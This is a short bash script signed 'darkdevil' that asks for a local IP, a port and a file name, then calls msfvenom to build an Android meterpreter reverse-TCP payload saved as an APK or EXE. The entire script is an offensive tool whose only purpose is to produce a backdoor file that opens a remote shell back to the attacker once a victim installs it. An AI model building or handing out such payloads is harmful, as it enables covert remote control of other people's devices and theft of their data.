#!/bin/bash

resize -s 70 100 > /dev/null


echo
echo -e $pink "............>>>>>> CODED BY: darkdevil <<<<<<.............."                                             
echo
echo -e $blue "enter your local ip for LHOST: "
read lh
echo
echo
echo -e $lightgreen "enter your port numer for LPORT: "
read lport
echo
echo
echo -e $red "enter your apk or exe file name here [with extension!!!!!]: "
read apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lport R>$apk
echo
echo
echo
echo "______________________________________THANKS FOR USING MY TOOL______________________________________"
